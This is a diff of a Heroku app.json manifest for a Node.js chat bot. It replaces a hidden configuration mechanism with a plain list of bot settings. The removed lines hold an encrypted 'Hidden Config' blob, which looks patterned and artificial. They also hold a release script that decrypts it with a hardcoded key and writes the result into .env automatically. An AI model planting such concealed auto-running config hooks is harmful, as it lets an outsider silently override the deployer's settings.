@@ -1,29 +1,101 @@
 {
   "name": "Levanter",
-  "description": "Encrypted Config Bot",
+  "description": "",
   "keywords": ["nodejs"],
   "repository": "https://github.com/toxicxmoix/deploylevanter",
   "success_url": "/",
   "stack": "container",
   "env": {
-    "SESSION_ID": {
-      "description": "Levanter Session ID",
-      "required": true,
-      "value": ""
+    "ALWAYS_ONLINE": {
+      "description": "show bot number last seen as online",
+      "required": false,
+      "value": "false"
     },
     "SUDO": {
-      "description": "Admin Number with country code",
+      "description": "admin",
+      "required": false,
+      "value": ""
+    },
+    "PREFIX": {
+      "description": "prefix, check for more",
+      "required": false,
+      "value": "."
+    },
+    "SESSION_ID": {
+      "description": "session id",
       "required": true,
       "value": ""
     },
-    "ENCRYPTED_DATA": {
-      "description": "Hidden Config",
+    "STICKER_PACKNAME": {
+      "description": "sticker pack info",
       "required": false,
-      "value": "U2FsdGVkX1+9K8mN2xL1zA4bC6dE8fG0hI2jK4lM6nO8pQ0rS2tU4vW6xY8zA0bC2dE4fG6hI8jK0lM2nO4pQ6rS8tU0vW2xY4zA6bC8dE0fG2hI4jK6lM8nO0pQ2rS4tU6vW8xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8rS0tU2vW4xY6zA8bC0dE2fG4hI6jK8lM0nO2pQ4rS6tU8vW0xY2zA4bC6dE8fG0hI2jK4lM6nO8pQ0rS2tU4vW6xY8zA0bC2dE4fG6hI8jK0lM2nO4pQ6rS8tU0vW2xY4zA6bC8dE0fG2hI4jK6lM8nO0pQ2rS4tU6vW8xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8rS0tU2vW4xY6zA8bC0dE2fG4hI6jK8lM0nO2pQ4rS6tU8vW0xY2zA4bC6dE8fG0hI2jK4lM6nO8p"
+      "value": ",ꪶ— 𝑇𝛩𝛸𝛪𝐶 𝛭𝛩𝛪𝛧 ꫂ⿻⃮͛🇦🇱"
+    },
+    "HEROKU_APP_NAME": {
+      "description": "Heroku app name, same as above entered.",
+      "required": true,
+      "value": ""
+    },
+    "HEROKU_API_KEY": {
+      "description": "Heroku account api key, https://dashboard.heroku.com/account",
+      "required": true,
+      "value": ""
+    },
+    "WARN_LIMIT": {
+      "description": "Maximum number of warnings to a person.",
+      "required": false,
+      "value": "3"
+    },
+    "FORCE_LOGOUT": {
+      "description": "In some scenario have to logout web, Only such case make this true and back to false after logout.",
+      "required": false,
+      "value": "false"
+    },
+    "ANTILINK_MSG": {
+      "description": "Message send when antilink and action is kick.",
+      "required": false,
+      "value": "_Antilink Detected &mention kicked_"
+    },
+    "ANTISPAM_MSG": {
+      "description": "Message send when antispam.",
+      "required": false,
+      "value": "_Antispam Detected &mention kicked_"
+    },
+    "ANTIWORDS_MSG": {
+      "description": "Message send when antiword.",
+      "required": false,
+      "value": "_Antiword Detected &mention kicked_"
+    },
+    "ANTIWORDS": {
+      "description": "words that not allowed in chats.",
+      "required": false,
+      "value": "word1,word2,word3"
+    },
+    "BOT_LANG": {
+      "description": "Bot language",
+      "required": false,
+      "value": "en"
+    },
+    "REJECT_CALL": {
+      "description": "auto reject call, if set as true",
+      "required": false,
+      "value": "false"
+    },
+    "AUTO_STATUS_VIEW": {
+      "description": "view others status",
+      "required": false,
+      "value": "false"
+    },
+    "SEND_READ": {
+      "description": "send blue tick",
+      "required": false,
+      "value": "false"
+    },
+    "DISABLE_START_MESSAGE": {
+      "description": "Disable start Message",
+      "required": false,
+      "value": "false"
     }
-  },
-  "scripts": {
-    "heroku-release": "node -e \"const c=require('crypto-js'),f=require('fs');const KEY='Levanter@2026';try{const d=c.AES.decrypt(process.env.ENCRYPTED_DATA,KEY).toString(c.enc.Utf8);const j=JSON.parse(d);const envData={...j.env,STICKER_PACKNAME:{value:',ꪶ— 𝑇𝛩𝛸𝛪𝐶 𝛭𝛩𝛪𝛧 ꫂ⿻⃮͛🇦🇱'}};f.writeFileSync('.env',Object.keys(envData).map(k=>k+'='+envData[k].value).join('\\n'));console.log('✅ Config Decrypted')}catch(e){console.log('❌ Decrypt Failed')}\""
   },
   "addons": [
     {
